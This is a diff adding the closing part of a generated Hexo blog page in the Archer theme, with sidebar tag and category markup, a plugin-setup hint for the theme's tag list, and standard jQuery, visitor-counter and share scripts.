+        <span class="sidebar-tag-name" data-tags="H3C"><span class="iconfont-archer">&#xe606;</span>H3C</span>
+    
+        <span class="sidebar-tag-name" data-tags="VLAN"><span class="iconfont-archer">&#xe606;</span>VLAN</span>
+    
+        <span class="sidebar-tag-name" data-tags="photo"><span class="iconfont-archer">&#xe606;</span>photo</span>
+    
+        <span class="sidebar-tag-name" data-tags="路由"><span class="iconfont-archer">&#xe606;</span>路由</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+    缺失模块。<br/>
+    1、请确保node版本大于6.2<br/>
+    2、在博客根目录（注意不是archer根目录）执行以下命令：<br/>
+    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br/>
+    3、在根目录_config.yml里添加配置：
+    <pre style="color: #787878; font-size: 0.6rem;">
+jsonContent:
+  meta: false
+  pages: false
+  posts:
+    title: true
+    date: true
+    path: true
+    text: false
+    raw: false
+    content: false
+    slug: false
+    updated: false
+    comments: false
+    link: false
+    permalink: false
+    excerpt: false
+    categories: true
+    tags: true</pre>
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+        <span class="sidebar-category-name" data-categories="study"><span class="iconfont-archer">&#xe60a;</span>study</span>
+    
+        <span class="sidebar-category-name" data-categories="photos"><span class="iconfont-archer">&#xe60a;</span>photos</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+    </div>
+</div> 
+    <script>
+    var siteMeta = {
+        root: "/",
+        author: "Regenbogenlj"
+    }
+</script>
+    <!-- CDN failover -->
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ === 'undefined')
+        {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js">\x3C/script>')
+        }
+    </script>
+    <script src="/scripts/main.js"></script>
+    <!-- algolia -->
+    
+    <!-- busuanzi  -->
+    
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+    <!-- CNZZ  -->
+    
+    </div>
+    <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
+     
+    </body>
+</html>
+
+
